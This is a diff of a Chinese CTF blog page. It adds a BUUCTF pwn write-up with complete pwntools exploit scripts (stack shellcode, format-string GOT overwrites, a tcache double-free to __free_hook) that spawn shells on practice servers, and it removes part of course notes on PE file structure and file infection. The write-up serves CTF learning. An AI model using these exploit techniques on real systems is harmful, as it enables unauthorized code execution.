@@ -150,6 +150,123 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/03/04/buuctf-pwn-write-ups-11/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="CoLin">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CoLin's BLOG">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/03/04/buuctf-pwn-write-ups-11/" class="post-title-link" itemprop="url">buuctf-pwn write-ups(11)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-03-04 11:06:14" itemprop="dateCreated datePublished" datetime="2023-03-04T11:06:14+08:00">2023-03-04</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-03-05 21:15:37" itemprop="dateModified" datetime="2023-03-05T21:15:37+08:00">2023-03-05</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/write-ups/" itemprop="url" rel="index"><span itemprop="name">write-ups</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/write-ups/buuctf-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">buuctf 系列</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>5.8k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>5 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="buu083-x_ctf_b0verfl0w"><a class="markdownIt-Anchor" href="#buu083-x_ctf_b0verfl0w"></a> buu083-x_ctf_b0verfl0w</h1>
+<p>这道题一共可写50字节，其中可以覆盖返回地址，又有sub esp, 24h和jmp esp这样的gadget，可以直接在栈上写shellcode，但是对于50字节的利用比较紧凑，需要对shellcraft的汇编代码稍作修改。</p>
+<p>其中将开头3个push改为2个，同时省去避免输入空字符所做的绕过，可以节省几个字节空间。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./b0verfl0w&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27901</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./b0verfl0w&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shell = <span class="string">&#x27;\</span></span><br><span class="line"><span class="string">	push 0x68732f;\</span></span><br><span class="line"><span class="string">	push 0x6e69622f;\</span></span><br><span class="line"><span class="string">	mov ebx, esp;\</span></span><br><span class="line"><span class="string">	push 0x6873;\</span></span><br><span class="line"><span class="string">	xor ecx, ecx;\</span></span><br><span class="line"><span class="string">	push ecx;\</span></span><br><span class="line"><span class="string">	push 4;\</span></span><br><span class="line"><span class="string">	pop ecx;\</span></span><br><span class="line"><span class="string">	add ecx, esp;\</span></span><br><span class="line"><span class="string">	push ecx;\</span></span><br><span class="line"><span class="string">	mov ecx, esp;\</span></span><br><span class="line"><span class="string">	xor edx, edx;\</span></span><br><span class="line"><span class="string">	jmp .1;\</span></span><br><span class="line"><span class="string">	pop eax;\</span></span><br><span class="line"><span class="string">	pop eax;\</span></span><br><span class="line"><span class="string">	pop eax;\</span></span><br><span class="line"><span class="string">	pop eax;\</span></span><br><span class="line"><span class="string">	.1:\</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"></span><br><span class="line">shell2 = <span class="string">&#x27;\</span></span><br><span class="line"><span class="string">	push 11;\</span></span><br><span class="line"><span class="string">	pop eax;\</span></span><br><span class="line"><span class="string">	int 0x80;\</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shell)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;name?\n&#x27;</span>, (p32(<span class="number">0x8048504</span>) + shellcode[:<span class="number">0x20</span>] + p32(<span class="number">0x80484fd</span>) + asm(shell2)).ljust(<span class="number">50</span>, <span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="buu084-picoctf_2018_leak_me"><a class="markdownIt-Anchor" href="#buu084-picoctf_2018_leak_me"></a> buu084-picoctf_2018_leak_me</h1>
+<p>这道题利用strcat函数即可泄露口令。虽然每一次生成靶机的时候口令都不一样，但方便的做法就是先泄露一次然后再跑一次直接输口令。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./PicoCTF_2018_leak-me&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28532</span>)</span><br><span class="line"></span><br><span class="line">password = <span class="string">b&#x27;a_reAllY_s3cuRe_p4s$word_f85406&#x27;</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;name?\n&#x27;</span>, cyclic(<span class="number">256</span>))</span><br><span class="line"></span><br><span class="line">io.sendline(password)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="buu085-inndy_echo"><a class="markdownIt-Anchor" href="#buu085-inndy_echo"></a> buu085-inndy_echo</h1>
+<p>格式化字符串漏洞。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./echo&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28212</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./echo&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;%8$s&#x27;</span> + p32(elf.got[<span class="string">&#x27;fgets&#x27;</span>]))</span><br><span class="line">fgets = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;fgets&#x27;</span>, fgets)</span><br><span class="line">base = fgets - libc.dump(<span class="string">&#x27;fgets&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>, &#123;elf.got[<span class="string">&#x27;printf&#x27;</span>]: system&#125;)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="buu086-hitcontraining_unlink"><a class="markdownIt-Anchor" href="#buu086-hitcontraining_unlink"></a> buu086-hitcontraining_unlink</h1>
+<p>同第73题。</p>
+<h1 id="buu087-ciscn_2019_final_3"><a class="markdownIt-Anchor" href="#buu087-ciscn_2019_final_3"></a> buu087-ciscn_2019_final_3</h1>
+<p>从表面上来看，这是一道C++ pwn，但实际上就是一个普通的堆题。</p>
+<p>只提供了2个选项：添加chunk和删除chunk，其中删除可以有double free，分配chunk只能分配0x78以内大小的chunk。每一次分配结束之后会返回堆地址。虽然本题我们获得了堆地址，但是程序和libc的加载地址都未知，而且看上去无法读取内存内容。</p>
+<p>因此我们就必须考虑另辟蹊径。</p>
+<p>思考一下，如果我们能够将chunk分配到main_arena中或者是__free_hook，那么分配之后的输出就能够让我们成功获取libc的地址。因此总的思路是：想尽办法将chunk分配到main_arena，获取libc地址后再想办法分配chunk到__free_hook。本题的libc版本为2.27-3ubuntu1，笔者的libc版本为2.27-3ubuntu1.6，这两个版本对于tcache的free操作不同，前者没有对于tcache的double free检查，而后者有，因此必须加上环境变量LD_PRELOAD选项。但即便如此，也只能勉强做题，因为没有dbg-symbols，我们无法在gdb中使用heap、bin等查看堆内容的关键性命令，这会使得做题变得很难受。不过由于这道题的出题时间比较早，出现这种情况也是完全可以理解的，做最近比赛的题目一般就不会有这种蛋疼的情况。</p>
+<p>说回到本题上。本题利用仅有的一个输出机会的方式如下图所示：<br />
+<img src="1.png" alt="" /></p>
+<p>注：图中浅色chunk比深色chunk的大小小。</p>
+<p>由于2.27-3ubuntu1版本中没有对tcache chunk的double free检测，我们甚至可以连续两次释放同一个chunk。释放后，首先分配一次出去，将fd指针修改到该chunk前面0x10字节，然后再一次分配，这一次分配就可以修改到这个chunk的大小，将其改成unsorted bin的范围，这样在free这个chunk之后，堆中就会出现2个相同的指向main_arena+96的地址。然后我们通过继续分配让这个chunk被切割，这里要注意一个细节，就是切割后main_arena+96的保存地址会修改，我们让这个地址被修改到下一个chunk的fd部分，再提前将这个chunk释放掉，这样tcache中就会链入main_arena+96的地址。如此操作之后，我们就能够向main_arena+96分配chunk。</p>
+<p>这里还要注意一个细节，我们要将第2个chunk的大小设置得与其他的chunk不同，可以假设一下，如果实现分配的所有chunk大小都相同，那么释放的顺序应该是2、1、1，这样第1个chunk才能在后面的malloc中优先被分配。在malloc两次之后，第1个chunk的大小被成功修改，此时tcache中还有1个chunk，那就是chunk 2，此时若想要切割unsorted bin chunk，就必须首先分配第2个chunk，此时tcache为空，即使此时chunk 2中的fd被修改为了main_arena+96，我们也无法在这个地方分配chunk了，因为它已经无法被链入到tcache链表，只有当chunk 2在释放状态时修改fd指针才行。</p>
+<p>有了libc的基地址之后，我们就可以如法炮制，通过double free将chunk轻松地分配到__free_hook，然后一次释放即可get shell。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process([&#x27;./ciscn_final_3&#x27;])</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28938</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">heap_addr = [<span class="number">0</span>] * <span class="number">0x18</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size, content</span>):</span><br><span class="line">	sla(<span class="string">b&#x27;choice &gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;input the index\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">	sla(<span class="string">b&#x27;input the size\n&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">	sa(<span class="string">b&#x27;now you can write something\n&#x27;</span>, content)</span><br><span class="line">	io.recvuntil(<span class="string">b&#x27;gift :0x&#x27;</span>)</span><br><span class="line">	heap_addr[index] = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)	</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	sla(<span class="string">b&#x27;choice &gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;input the index\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x70</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x40</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x70</span>, <span class="string">b&#x27;/bin/sh\n&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x60</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x60</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x60</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x70</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x70</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x70</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x10</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x70</span>, p64(heap_addr[<span class="number">0</span>] - <span class="number">0x10</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x70</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">12</span>, <span class="number">0x70</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x8</span> + p64(<span class="number">0x421</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">13</span>, <span class="number">0x70</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">14</span>, <span class="number">0x40</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">15</span>, <span class="number">0x40</span>, <span class="string">b&#x27;\x00&#x27;</span>)	<span class="comment"># to main_arena + 96</span></span><br><span class="line">__malloc_hook = heap_addr[<span class="number">15</span>] - <span class="number">0x70</span></span><br><span class="line">base = __malloc_hook - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;libc base = &#x27;</span> + <span class="built_in">hex</span>(base))</span><br><span class="line">__free_hook = base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;__free_hook = &#x27;</span> + <span class="built_in">hex</span>(__free_hook))</span><br><span class="line">system = base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">16</span>, <span class="number">0x60</span>, p64(__free_hook) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">17</span>, <span class="number">0x60</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">18</span>, <span class="number">0x60</span>, p64(system) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="buu088-axb_2019_fmt64"><a class="markdownIt-Anchor" href="#buu088-axb_2019_fmt64"></a> buu088-axb_2019_fmt64</h1>
+<p>和第85题神相似。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./axb_2019_fmt64&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26942</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./axb_2019_fmt64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please tell me:&#x27;</span>, <span class="string">b&#x27;%9$s\x00\x00\x00\x00&#x27;</span> + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Repeater:&#x27;</span>)</span><br><span class="line">puts = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts)</span><br><span class="line">base = puts - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">8</span>, &#123;elf.got[<span class="string">&#x27;strlen&#x27;</span>]: system&#125;, numbwritten=<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please tell me:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io, &#x27;b *0x4008d0&#x27;)</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;||/bin/sh&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/03/03/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E7%9C%9F%E9%A2%98%E6%80%BB%E7%BB%93/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2523,251 +2640,6 @@ SEH：Structured Exception Handler，异常处理模块，以链表形式存在�
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/03/03/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E7%AC%AC4%E7%AB%A0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="CoLin">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CoLin's BLOG">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/03/03/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E7%AC%AC4%E7%AB%A0/" class="post-title-link" itemprop="url">软件安全——第4章</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2023-03-03 09:44:33 / Modified: 09:47:34" itemprop="dateCreated datePublished" datetime="2023-03-03T09:44:33+08:00">2023-03-03</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">课内笔记</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">软件安全</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">Symbols count in article: </span>
-              <span>7.5k</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>7 mins.</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="chapter-4-pe文件结构"><a class="markdownIt-Anchor" href="#chapter-4-pe文件结构"></a> Chapter 4 PE文件结构</h1>
-<h2 id="41-pe文件及其表示形式"><a class="markdownIt-Anchor" href="#41-pe文件及其表示形式"></a> 4.1 PE文件及其表示形式</h2>
-<p>可移植的可执行文件（Portable Executable File）<br />
-PE文件主要包括：.exe，.dll，.sys等，.dll是动态加载库，不能直接执行</p>
-<p>在DOS系统中，可执行文件格式为MZ</p>
-<h2 id="42-pe文件格式与恶意软件的关系"><a class="markdownIt-Anchor" href="#42-pe文件格式与恶意软件的关系"></a> 4.2 PE文件格式与恶意软件的关系</h2>
-<p>文件感染：</p>
-<ul>
-<li>使PE文件具备病毒功能</li>
-<li>而又不破坏PE文件原有的功能和外在形态</li>
-<li>感染与控制权获取</li>
-</ul>
-<p>方法：</p>
-<ul>
-<li>代码植入</li>
-<li>控制权获取</li>
-<li>图标更改等（如熊猫烧香）</li>
-</ul>
-<p><strong>注意</strong>：PE文件感染实质上就是修改文件的内容，与修改文本文件中的内容性质相同。PE文件与文本文件同是文件，但不同的是windows系统内核已经被设计好能够识别PE文件的结构并执行其中的代码，所以PE文件与文本文件有差异。</p>
-<h2 id="43-pe文件总体结构"><a class="markdownIt-Anchor" href="#43-pe文件总体结构"></a> 4.3 PE文件总体结构</h2>
-<p><strong>1. MS_DOS HEADER</strong></p>
-<p>PE文件开头位置，用于PE文件开头位置定位与合法性检测。长度为0x40。开头两个字符为’MZ’。，结尾4字节(0x3C)为新exe HEADER的地址。设计MS_DOS HEADER是为了<strong>向下兼容DOS系统</strong>（如果不是为了这个目的完全可以将NT HEADER作为PE文件头），在DOS系统执行此文件时会显示该文件无法在DOS模式下运行。</p>
-<p><strong>2. MS_DOS Stub</strong></p>
-<p>在MS_DOS下运行的程序代码与数据，一般为提醒用户’This Program cannot be run in DOS mode’</p>
-<p><strong>3. NT HEADER</strong></p>
-<p>分为3个部分：开头字符串’PE\0\0’、映像文件头、可选文件头</p>
-<p>(1) 开头字符串：用于表示该文件是否为可执行文件<br />
-(2) File Header：映像文件头，包含可执行文件的一些必要信息，一般紧跟在开头字符串后面，包含的项有：</p>
-<ul>
-<li>Machine：机器类型，2字节，0x14C表示x86架构</li>
-<li><strong>Number of Sections</strong>：节数量，2字节，PE文件中代码、数据等分别存放于不同的节中。</li>
-<li>TimeDataStamp：4字节，生成该文件的时间，指从1970年1月1日开始计算经过的秒数。</li>
-<li>Pointer to Symbol Table：4字节，COFF符号表偏移（COFF文件：通用对象文件格式，PE文件便是基于COFF文件设计，不要求掌握）</li>
-<li>Number of Symbols：4字节，符号数量（指COFF符号表中的符号）</li>
-<li><strong>Size of Optional Header</strong>：2字节，可选头大小</li>
-<li>Characteristics：4字节，表示该文件是exe文件还是dll文件</li>
-</ul>
-<p>(3) Optional Header：可选文件头，包含可执行文件的其他必要信息，长度由节数量等因素确定</p>
-<ul>
-<li><strong>Address of Entry Point (PE_HEADER+0x28, 4 bytes)</strong>：准备运行的文件的第一条指令的RVA（<strong>RVA</strong>：相对虚拟地址，相对于内存中Image Base的地址）</li>
-<li><strong>Image Base (PE_HEADER+0x34, 4 bytes)</strong>：内存镜像加载地址，PE文件在内存中的优先装载地址。
-<ul>
-<li>病毒不能只靠修改Image Base执行自己的代码，因为原有代码中可能存在如call 0x401010的代码，其中0x401010是硬编码在指令中的，一旦Image Base发生变化，这些硬编码地址可能就将无效，程序原有的代码也将无法执行。</li>
-</ul>
-</li>
-<li><strong>Section Alignment (PE_HEADER+0x38, 4 bytes)</strong>：内存中节对齐的粒度</li>
-<li><strong>File Alignment (PE_HEADER+0x3C, 4 bytes)</strong>：文件中节对齐的粒度
-<ul>
-<li>注意这里内存节对齐和文件节对齐粒度的理解。内存中节与节之间的地址之差与文件中的很可能不一样，在文件中，为了减少存储空间的浪费，通常不会将节对齐粒度设置得太大，一般为0x200，而内存中节对齐一般取0x1000作为粒度。</li>
-</ul>
-</li>
-<li><strong>Data Directory (PE_HEADER+0x78, 8n bytes)</strong>：开头记录Data Directory中节属性数量，每一条属性长度均为8字节，记录这些节的RVA和size。这些节与常用的代码节、数据节等不同，多为辅助节，如导入表、导出表、引入地址表（IAT）等，保存程序运行的关键控制信息。</li>
-</ul>
-<p><strong>4. Section Tables</strong></p>
